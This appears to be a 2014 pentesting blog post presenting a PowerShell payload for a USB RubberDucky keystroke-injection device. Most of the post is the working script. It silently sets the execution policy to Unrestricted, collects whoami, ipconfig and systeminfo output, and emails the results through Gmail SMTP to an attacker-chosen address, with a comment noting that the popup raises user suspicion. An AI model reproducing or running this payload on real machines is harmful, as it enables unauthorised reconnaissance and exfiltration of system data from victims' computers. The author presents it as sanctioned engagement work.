---
title: "RubberDucky Powershell Payload"
date: "2014-12-22T12:00:00-04:00"
url: "/posts/rubber-ducky-powershell-payload"
categories:
- infosec
tags:
- powershell
- pentesting
---

On a recent engagement I supported the lead by developing a PowerShell payload
for a [RubberDucky][RubberDucky]. The gist is that it will run a handful of
standard Windows commands and then e-mail the results to a specified address. It
proved to be very helpful and I've included it below with comments:

~~~~
	# Set execution policy to allow unrestricted script scope
	Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false
	#Create results file in current user's temp directory
	$results = $env:temp + '\results.txt'

	#Run whoami
	$who = 'whoami.exe'
	$rwho = & $who

	#Run ipconfig /all
	$ipc = 'ipconfig.exe'
	$ipcs = '/all'
	$ripc = & $ipc $ipcs

	#Run systeminfo
	$sysi = 'systeminfo.exe'
	$rsysi = & $sysi

	#Wait for systeminfo to finish
	Start-Sleep -s 5

	#Write results
	$output = $rwho + $ripc + $rsysi | Out-File $results

	#Send results to e-mail address
	$hostname = $env:computername
	$SMTPServer = 'smtp.gmail.com'
	$SMTPInfo = New-Object Net.Mail.SmtpClient($SMTPServer, 587)
	$SMTPInfo.EnableSsl = $true
	$SMTPInfo.Credentials = New-Object System.Net.NetworkCredentials('<yourusername>', '<yourpassword>')
	$ResultMail = New-Object System.Net.Mail.MailMessage
	$ResultMail.From = '<fromaddress>'
	$ResultMail.To.Add('<destinationmail>')
	$ResultMail.Subject = "Mail Subject"
	$ResultMail.Body = "Mail Body"
	$ResultMail.Attachments.Add($results)
	$SMTPInfo.Send($ResultMail)

	#Optional pop-up confirmation box
	#Note: This WILL raise user suspicion
	$wshell = New-Object -ComObject Wscript.Shell
	$wshell.Popup("Operation Complete.", 0, "OK", 0x1)
~~~~

Merry Christmas and Happy Holidays!

[RubberDucky]: http://hakshop.myshopify.com/products/usb-rubber-ducky-deluxe
